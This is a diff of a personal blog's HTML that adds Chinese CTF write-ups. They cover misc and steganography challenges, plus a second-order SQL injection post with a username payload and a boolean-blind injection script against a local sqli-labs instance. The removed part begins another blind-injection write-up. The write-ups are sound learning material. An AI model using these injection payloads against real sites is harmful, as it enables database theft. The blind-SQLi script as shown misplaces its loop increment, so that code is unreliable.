@@ -71,6 +71,204 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-115" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/09/page-115/" class="article-date">
+  <time class="dt-published" datetime="2021-09-09T09:00:56.000Z" itemprop="datePublished">2021-09-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/09/09/page-115/">又是misc</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h5 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h5><p>文本文档什么 cs pu lt 90 fd 500 有点熟悉 是你小乌龟<br><a target="_blank" rel="noopener" href="https://www.calormen.com/jslogo/">https://www.calormen.com/jslogo/</a>  配合这个使用将文档内容粘贴进去</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/225.PNG?raw=true" alt="225.PNG"></p>
+<h5 id="蜘蛛侠呀"><a href="#蜘蛛侠呀" class="headerlink" title="蜘蛛侠呀"></a>蜘蛛侠呀</h5><p>什么玩意抓包文件哪有蜘蛛侠(・∀・(・∀・(・∀・*)<br>不对 所有icmp包后面都跟了一串数据 tshark提取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r out.pcap -T fields -e data &gt; data.txt</span><br></pre></td></tr></table></figure>
+
+<p>一个十兆多的文档很划算9兆的文件生成10兆的文档 有重复</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/226.PNG?raw=true" alt="226.PNG"></p>
+<p> 搞脚本去重</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;data.txt&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    res_list = []</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">    print(&#x27;[+]去重之前一共&#123;0&#125;行&#x27;.format(len(lines)))</span><br><span class="line">    print(&#x27;[+]开始去重，请稍等.....&#x27;)</span><br><span class="line">    for i in lines:</span><br><span class="line">        if i not in res_list:</span><br><span class="line">            res_list.append(i)</span><br><span class="line">    print(&#x27;[+]去重后一共&#123;0&#125;行&#x27;.format(len(res_list)))</span><br><span class="line">    print(res_list)</span><br><span class="line"></span><br><span class="line">with open(&#x27;data1.txt&#x27;, &#x27;w&#x27;) as new_file:</span><br><span class="line">    for j in res_list:</span><br><span class="line">        new_file.write(j)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/227.PNG?raw=true" alt="227.PNG"></p>
+<p>六万多行直接没掉了 <strong>因为wireshark是直接将十六进制导出还得转一下</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line"></span><br><span class="line">with open(&#x27;data1.txt&#x27;,&#x27;r&#x27;) as file:</span><br><span class="line">    with open(&#x27;data2.txt&#x27;,&#x27;wb&#x27;) as data:</span><br><span class="line">        for i in file.readlines():</span><br><span class="line">            data.write(binascii.unhexlify(i[:-1]))</span><br></pre></td></tr></table></figure>
+
+<p>十六转字符<br><strong>将$$START$$ 和首末行 还有换行删掉 用word 查找替换 换行符是^p</strong><br>base64 解一下是压缩文件</p>
+<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/228.PNG?raw=true" alt="228.PNG"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">with open(&#x27;data2.txt&#x27;,&#x27;rb&#x27;) as file:</span><br><span class="line">    with open(&#x27;data.zip&#x27;,&#x27;wb&#x27;) as new_file:</span><br><span class="line">        new_file.write(base64.b64decode(file.read()))</span><br></pre></td></tr></table></figure>
+
+<p>用脚本将其转为base64在写入压缩文件中解压缩 </p>
+<p>终于看到蜘蛛侠了 然后就不会了看别人的去<br><strong>这是时间隐写 用Linux下的identify -format “%T” flag.gif</strong><br>得到这么一串<br>2050502050502050205020202050202020205050205020502050205050505050202050502020205020505050205020206666<br><strong>20-&gt;0 50-&gt;1</strong><br>011011010100010000110101010111110011000101110100  </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/247.PNG?raw=true" alt="247.PNG"></p>
+<h4 id="MRCTF2020-不眠之夜"><a href="#MRCTF2020-不眠之夜" class="headerlink" title="[MRCTF2020]不眠之夜"></a>[MRCTF2020]不眠之夜</h4><p>一堆散掉的图 拼图题 <strong>单张分辨率200*100 共120张 长10张 宽12张 拼起来总图长2000宽1200</strong><br><strong>用momtage 和gaps</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">montage *jpg -tile 10x12 -geometry 200x100+0+0 flag.jpg</span><br><span class="line">gaps --image=flag.jpg --generations=40 --population=120 --size=100</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/248.PNG?raw=true" alt="248.PNG"></p>
+<h4 id="ACTF新生赛2020-明文攻击"><a href="#ACTF新生赛2020-明文攻击" class="headerlink" title="[ACTF新生赛2020]明文攻击"></a>[ACTF新生赛2020]明文攻击</h4><p>解压缩拿到图和包 题目<strong>描述明文攻击</strong><br>图片010打开发现 末尾一段类似压缩包的在最后一个32后面添加文件头50 4B 拿到压缩包</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/249.PNG?raw=true" alt="249.PNG"></p>
+<p> 俩包CRC值是一样的</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/250.PNG?raw=true" alt="250.PNG"></p>
+<p>也说了明文攻击很明显了  用那个advanced什么的来跑就可以了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/251.PNG?raw=true" alt="251.PNG"></p>
+<h4 id="安洵杯-2019-easy-misc"><a href="#安洵杯-2019-easy-misc" class="headerlink" title="[安洵杯 2019]easy misc"></a>[安洵杯 2019]easy misc</h4><p>read里面一大堆的英语文档 应该是存在<strong>字频隐写</strong><br>加密的压缩包打开有<strong>一段注释</strong></p>
+<p>计算得7+NNULULL 前<strong>七位可能是数字用掩码破解</strong> </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/252.PNG?raw=true" alt="252.PNG"></p>
+<p>拿到文档</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">b = sSD</span><br><span class="line">c = adE </span><br><span class="line">d = jVf</span><br><span class="line">e = QW8</span><br><span class="line">f = SA=</span><br><span class="line">g = jBt</span><br><span class="line">h = 5RE</span><br><span class="line">i = tRQ</span><br><span class="line">j = SPA</span><br><span class="line">k = 8DS</span><br></pre></td></tr></table></figure>
+
+<p>  <strong>字频没错了</strong><br>小姐姐.png 010发现有<strong>两张图片分离出来</strong> 然后就不会了<br><strong>看了别人的发现是盲水印</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\bwm.py decode .\1.png .\2.png res.png</span><br><span class="line">image&lt;.\1.png&gt; + image(encoded)&lt;.\2.png&gt; -&gt; watermark&lt;res.png&gt;</span><br></pre></td></tr></table></figure>
+
+<p>拿到个图</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/253.PNG?raw=true" alt="253.PNG"></p>
+<p>然后拿11.txt的字频 hint里说<strong>取前十六个字符</strong> etaonrhisdluygw就是这几个</p>
+<h6 id="和刚才的decode-txt进行对照"><a href="#和刚才的decode-txt进行对照" class="headerlink" title="和刚才的decode.txt进行对照"></a>和刚才的<strong>decode.txt进行对照</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">code_str = &#x27;etaonrhisdluygw&#x27;</span><br><span class="line">code_dict = &#123;&#x27;a&#x27;:&#x27;dIW&#x27;,&#x27;b&#x27;:&#x27;sSD&#x27;,&#x27;c&#x27;:&#x27;adE &#x27;,&#x27;d&#x27;:&#x27;jVf&#x27;,&#x27;e&#x27;:&#x27;QW8&#x27;,&#x27;f&#x27;:&#x27;SA=&#x27;,&#x27;g&#x27;:&#x27;jBt&#x27;,&#x27;h&#x27;:&#x27;5RE&#x27;,&#x27;i&#x27;:&#x27;tRQ&#x27;,&#x27;j&#x27;:&#x27;SPA&#x27;,&#x27;k&#x27;:&#x27;8DS&#x27;,&#x27;l&#x27;:&#x27;XiE&#x27;,&#x27;m&#x27;:&#x27;S8S&#x27;,&#x27;n&#x27;:&#x27;MkF&#x27;,&#x27;o&#x27;:&#x27;T9p&#x27;,&#x27;p&#x27;:&#x27;PS5&#x27;,&#x27;q&#x27;:&#x27;E/S&#x27;,&#x27;r&#x27;:&#x27;-sd&#x27;,&#x27;s&#x27;:&#x27;SQW&#x27;,&#x27;t&#x27;:&#x27;obW&#x27;,&#x27;u&#x27;:&#x27;/WS&#x27;,&#x27;v&#x27;:&#x27;SD9&#x27;,&#x27;w&#x27;:&#x27;cw=&#x27;,&#x27;x&#x27;:&#x27;ASD&#x27;,&#x27;y&#x27;:&#x27;FTa&#x27;,&#x27;z&#x27;:&#x27;AE7&#x27;&#125;</span><br><span class="line">base_str=&#x27;&#x27;</span><br><span class="line">for i in code_str:</span><br><span class="line">    i = code_dict[i]</span><br><span class="line">    base_str += i</span><br><span class="line">print(base_str)</span><br></pre></td></tr></table></figure>
+
+<p>QW8obWdIWT9pMkF-sd5REtRQSQWjVfXiE/WSFTajBtcw=</p>
+<p>去掉无效字符- 然后怎么解码都没有结果<br>看别人的wp都有 离谱玩意</p>
+<h4 id="MRCTF2020-Hello-misc"><a href="#MRCTF2020-Hello-misc" class="headerlink" title="[MRCTF2020]Hello_ misc"></a>[MRCTF2020]Hello_ misc</h4><p>图和包 <strong>图的红通道0拿到一张图</strong> 然后<strong>文件分离拿到压缩包</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/254.PNG?raw=true" alt="254.PNG"></p>
+<h4 id="解压成功-然后out-txt都是127-255-63-191-TTL隐写"><a href="#解压成功-然后out-txt都是127-255-63-191-TTL隐写" class="headerlink" title="解压成功 然后out.txt都是127 255 63 191 TTL隐写"></a>解压成功 然后out.txt都是127 255 63 191 TTL隐写</h4><p><strong>00 替代63 01 替代127 10 替代191 11 替代255</strong><br>脚本走</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">with open(&#x27;out.txt&#x27;) as f:</span><br><span class="line">    lines = f.readlines()</span><br><span class="line">n_num = []</span><br><span class="line">#分析出所有的数</span><br><span class="line">for i in lines:</span><br><span class="line">    if i!=&#x27;\n&#x27;:</span><br><span class="line">        n_num.append(int(i))</span><br><span class="line">#拿到每个TTL值的高位</span><br><span class="line">rlt = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(lines)):</span><br><span class="line">    tmp = bin(n_num[i])[2:]</span><br><span class="line">    tmp = &#x27;0&#x27;*(8-len(tmp)) + tmp</span><br><span class="line">    rlt += tmp[0:2]</span><br><span class="line">#得到最终的结果并存到文件中</span><br><span class="line">rlt2 = &#x27;&#x27;</span><br><span class="line">for i in range(0,len(rlt),8):</span><br><span class="line">    rlt2 += chr(int(rlt[i:i+8],2))</span><br><span class="line">with open(&#x27;fi.txt&#x27;,&#x27;w&#x27;) as f:</span><br><span class="line">    f.write(rlt2.rstrip())</span><br></pre></td></tr></table></figure>
+
+<p> 拿到压缩包密码</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/255.PNG?raw=true" alt="255.PNG"></p>
+<p>解压后还是一个压缩包再解压 变成一堆的文档 <strong>有word doc 那么这个包原本应该是doc格式</strong><br>改格式可以打开<strong>然后全选换一下颜色一些base64码</strong><br>转码发现都是0和1 将所有的1换成空格</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">with open(&#x27;flag.txt&#x27;,&#x27;r&#x27;) as file:</span><br><span class="line">    for i in file.readlines():</span><br><span class="line">        line = str(base64.b64decode(i),&#x27;utf8&#x27;)</span><br><span class="line">        print(line.replace(&#x27;1&#x27;,&#x27; &#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>flag 到手</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/257.PNG?raw=true" alt="257.PNG"></p>
+<h4 id="MRCTF2020-Unravel"><a href="#MRCTF2020-Unravel" class="headerlink" title="[MRCTF2020]Unravel!!"></a>[MRCTF2020]Unravel!!</h4><p>图和包标准配置 还有个音频 wav用010打开然后<strong>末尾一串类似于base64的</strong></p>
+<h4 id="解码发现是salted开头的-好aes或者des加密"><a href="#解码发现是salted开头的-好aes或者des加密" class="headerlink" title="解码发现是salted开头的 好aes或者des加密"></a><strong>解码发现是salted开头的 好aes或者des加密</strong></h4><p>图片分离一下图和压缩包 压缩包解压的到这个</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/258.PNG?raw=true" alt="258.PNG"></p>
+<p>那就是aes了 <a target="_blank" rel="noopener" href="http://www.metools.info/code/c24.html">http://www.metools.info/code/c24.html</a></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/259.PNG?raw=true" alt="259.PNG"></p>
+<h5 id="拿到解压密码-解压也是wav-丢010-末尾有一串不知道是什么的"><a href="#拿到解压密码-解压也是wav-丢010-末尾有一串不知道是什么的" class="headerlink" title="拿到解压密码 解压也是wav 丢010 末尾有一串不知道是什么的"></a>拿到解压密码 解压也是wav 丢010 末尾有一串不知道是什么的</h5><p>直接丢silenteye decode一下 ok</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/260.PNG?raw=true" alt="260.PNG"></p>
+<h4 id="WUSTCTF2020-spaceclub"><a href="#WUSTCTF2020-spaceclub" class="headerlink" title="WUSTCTF2020]spaceclub"></a>WUSTCTF2020]spaceclub</h4><p>全选一下就能看出东西来</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/261.PNG?raw=true" alt="261.PNG"></p>
+<h5 id="短的0长的1"><a href="#短的0长的1" class="headerlink" title="短的0长的1"></a>短的0长的1</h5><p>011101110110001101110100011001100011001000110000001100100011000001111011011010000011001101110010011001010101111100110001011100110101111101111001001100000111010101110010010111110110011001101100010000000110011101011111011100110011000101111000010111110111001100110001011110000101111101110011001100010111100001111101</p>
+<p><strong>二进制转字符就可以了</strong></p>
+<h4 id="派大星的烦恼"><a href="#派大星的烦恼" class="headerlink" title="派大星的烦恼"></a>派大星的烦恼</h4><p><strong>题目提示了重点在0x22 0x44</strong><br>010打开将<strong>所有的 22 44</strong> 复制出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">infile = open(&quot;321.txt&quot;, &quot;r&quot;)</span><br><span class="line">outfile = open(&quot;312.txt&quot;, &quot;w&quot;)</span><br><span class="line">for line in infile:</span><br><span class="line">    outfile.write(line.replace(&#x27;22&#x27;,&#x27;0&#x27;))</span><br><span class="line">    #outfile.write(line.replace(&#x27;44&#x27;,&#x27;1&#x27;))</span><br><span class="line">infile.close()</span><br><span class="line">outfile.close()</span><br></pre></td></tr></table></figure>
+
+<p>然后替换一下 得到新文本<br><a target="_blank" rel="noopener" href="http://www.txttool.com/wenben_alltrim.asp">http://www.txttool.com/wenben_alltrim.asp</a>  去掉空格<br><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/zh/daoxu/">https://www.qqxiuzi.cn/zh/daoxu/</a>    将文本逆序一下<br>然后二进制转字符<br><strong>再逆序一下就可以了</strong></p>
+<h4 id="湖南省赛2019-Findme"><a href="#湖南省赛2019-Findme" class="headerlink" title="[湖南省赛2019]Findme"></a>[湖南省赛2019]Findme</h4><p>首先五张图 <strong>1.png简直不是图</strong> 先解决他<br>首先crc校验就有问题</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import zlib</span><br><span class="line">import struct</span><br><span class="line">file = &#x27;1.png&#x27;</span><br><span class="line">fr = open(file,&#x27;rb&#x27;).read()</span><br><span class="line">data = bytearray(fr[12:29])</span><br><span class="line">crc32key = 0xC4ED3  </span><br><span class="line">n = 4095 </span><br><span class="line">for w in range(n): </span><br><span class="line">    width = bytearray(struct.pack(&#x27;&gt;i&#x27;, w))</span><br><span class="line">    for h in range(n): </span><br><span class="line">        height = bytearray(struct.pack(&#x27;&gt;i&#x27;, h)) </span><br><span class="line">        for x in range(4): </span><br><span class="line">            data[x+4] = width[x] </span><br><span class="line">            data[x+8] = height[x] </span><br><span class="line">            #print(data) </span><br><span class="line">        crc32result = zlib.crc32(data) </span><br><span class="line">        if crc32result == crc32key: </span><br><span class="line">            print(width,height) </span><br><span class="line">            print(data) </span><br><span class="line">            newpic = bytearray(fr) </span><br><span class="line">            for x in range(4): </span><br><span class="line">                newpic[x+16] = width[x]</span><br><span class="line">                newpic[x+20] = height[x] </span><br><span class="line">            fw = open(file+&#x27;.png&#x27;,&#x27;wb&#x27;) </span><br><span class="line">            fw.write(newpic) </span><br><span class="line">            fw.close </span><br></pre></td></tr></table></figure>
+
+<p>用脚本修复一下 然后<strong>提示chunk[2][3]提示有问题发现缺了IDAT</strong><br>添加一下</p>
+<p>拿到原图 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/262.PNG?raw=true" alt="262.PNG"></p>
+<p>拿到二维码</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/263.PNG?raw=true" alt="263.PNG"></p>
+<p><strong>获得如下内容ZmxhZ3s0X3</strong></p>
+<p><strong>2.png 文件末尾的37 7A 03 04 这个和zip的50 4B 03 04 的文件头有点像</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/264.PNG?raw=true" alt="264.PNG"></p>
+<p>修改试一下 <strong>改一个还不行</strong></p>
+<p>得<strong>全部改掉改成PK</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/265.PNG?raw=true" alt="265.PNG"></p>
+<p>解压得到<strong>大量文档按大小排</strong>618.txt不太对劲 <strong>You find it: 1RVcmVfc 第二串</strong></p>
+<h6 id="3-png"><a href="#3-png" class="headerlink" title="**3.png **"></a>**3.png **</h6><h5 id="它的crc值和其他人不太一样-抓出来转成字符一下看看"><a href="#它的crc值和其他人不太一样-抓出来转成字符一下看看" class="headerlink" title="它的crc值和其他人不太一样 抓出来转成字符一下看看"></a><strong>它的crc值和其他人不太一样</strong> 抓出来转成字符一下看看</h5><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/267.PNG?raw=true" alt="267.PNG"></p>
+<img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/268.PNG?raw=true" alt="268.PNG" style="zoom:50%;" />
+
+<p><strong>3RlZ30= 第三串</strong></p>
+<h6 id="4-png"><a href="#4-png" class="headerlink" title="4.png"></a>4.png</h6><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/269.PNG?raw=true" alt="269.PNG"></p>
+<p><strong>cExlX1BsY=</strong></p>
+<h6 id="5-png"><a href="#5-png" class="headerlink" title="5.png"></a>5.png</h6><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/270.PNG?raw=true" alt="270.PNG"></p>
+<h5 id="Yzcllfc0lN"><a href="#Yzcllfc0lN" class="headerlink" title="Yzcllfc0lN"></a>Yzcllfc0lN</h5><p><strong>1 5 4 2 3 组合</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/271.PNG?raw=true" alt="271.PNG"></p>
+<h4 id="ACTF新生赛2020-music"><a href="#ACTF新生赛2020-music" class="headerlink" title="[ACTF新生赛2020]music"></a>[ACTF新生赛2020]music</h4><p>说是m4a格式 但是打不开啊 ╮(╯▽╰)╭<br>010和正经的m4a对比一下 </p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/276.PNG?raw=true" alt="276.PNG"></p>
+<p><strong>左边正常 右边这题给的文件</strong></p>
+<h5 id="很多的A1-用010的十六进制计算工具将所有的A1进行异或"><a href="#很多的A1-用010的十六进制计算工具将所有的A1进行异或" class="headerlink" title="很多的A1 用010的十六进制计算工具将所有的A1进行异或"></a>很多的A1 用010的十六进制计算工具将所有的A1进行异或</h5><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/277.PNG?raw=true" alt="277.PNG"></p>
+<p>就拿到原本的文件了</p>
+<p>听出flag</p>
+<h5 id="UTCTF2020-zero"><a href="#UTCTF2020-zero" class="headerlink" title="[UTCTF2020]zero"></a>[UTCTF2020]zero</h5><p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/278.PNG?raw=true" alt="278.PNG"></p>
+<p>提示gbk什么的 然后题目也说了zero 零 (・∀・(・∀・(・∀・*)<br>有个玩意叫做零宽度字符隐写<br><a target="_blank" rel="noopener" href="https://330k.github.io/misc_tools/unicode_steganography.html">https://330k.github.io/misc_tools/unicode_steganography.html</a><br>就能拿到flag </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/09/page-115/" data-id="cktcs08ea000108w7bjwi7abo" data-title="又是misc" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-114" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/09/09/page-114/" class="article-date">
+  <time class="dt-published" datetime="2021-09-09T08:37:38.000Z" itemprop="datePublished">2021-09-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/09/09/page-114/">page</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h6 id="这是二次注入的关卡-就register-php那边需要用户名-但是登录过程不需要"><a href="#这是二次注入的关卡-就register-php那边需要用户名-但是登录过程不需要" class="headerlink" title="这是二次注入的关卡 就register.php那边需要用户名 但是登录过程不需要"></a>这是二次注入的关卡 就register.php那边需要用户名 但是登录过程不需要</h6><p>登陆后可以看到用户名 测试了一下用户名那边<strong>过滤了information 和逗号</strong></p>
+<p>好再来学一个神奇的sql方式 </p>
+<p>通过hex将数据库的名字转成十六进制输出</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/272.PNG?raw=true" alt="272.PNG"></p>
+<p>用户名：’+hex(database())+’</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/273.PNG?raw=true" alt="273.PNG"></p>
+<p>数据库名字web</p>
+<blockquote>
+<p>在本地测试下。发现一次HEX。字符串还是会存在英文。会退出。那就2次hex。发现变成了科学计数法。用substr截取就可以了。 </p>
+</blockquote>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/274.PNG?raw=true" alt="274.PNG"></p>
+<p>上脚本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://127.0.0.1/sqli-labs/Less-8&quot;</span><br><span class="line"></span><br><span class="line">normalHtmlLen = len(requests.get(url=url+&quot;?id=1&quot;).text)</span><br><span class="line"></span><br><span class="line">print(str(normalHtmlLen))</span><br><span class="line"></span><br><span class="line">dbNameLen = 0</span><br><span class="line">while True:</span><br><span class="line">    dbNameLen_url = url+&quot;?id=1&#x27;+and+length(database())=&quot;+str(dbNameLen)+&quot;--+&quot;</span><br><span class="line">    print(dbNameLen_url)</span><br><span class="line">    if len(requests.get(dbNameLen_url).text) == normalHtmlLen:</span><br><span class="line">        print(dbNameLen)</span><br><span class="line">        break</span><br><span class="line">    if dbNameLen == 30:</span><br><span class="line">        print(&quot;ERROR&quot;)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">dbNameLen +=1</span><br></pre></td></tr></table></figure>
+
+<p>结果两次转码一下就完成了</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/275.PNG?raw=true" alt="275.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/09/09/page-114/" data-id="cktcs08e3000008w75b2g99fr" data-title="page" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-110" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/08/13/page-110/" class="article-date">
@@ -595,131 +793,6 @@
 
 
   
-    <article id="post-page-102" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/13/page-102/" class="article-date">
-  <time class="dt-published" datetime="2021-08-13T09:37:12.000Z" itemprop="datePublished">2021-08-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/13/page-102/">GYCTF2020Ezsqli</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>是个盲注题<br>但是过滤了好多好多好多东西 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or union select（合在一起不行） information （这个被禁了基本只能盲注和无列名注入）</span><br></pre></td></tr></table></figure>
-
-<p>无列名注入 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">测试：</span><br><span class="line">id=2||1=1 返回nu1l</span><br><span class="line">id=2||1=2 返回v&amp;n </span><br><span class="line">真返nu1l 假返回v&amp;n</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/183.PNG?raw=true" alt="183.PNG"></p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/184.PNG?raw=true" alt="184.PNG"></p>
-<p>走脚本爆表名字<br>通过无列名注入 <strong>innodb引擎或者sys数据库</strong>可以使用但是只能拿到表名</p>
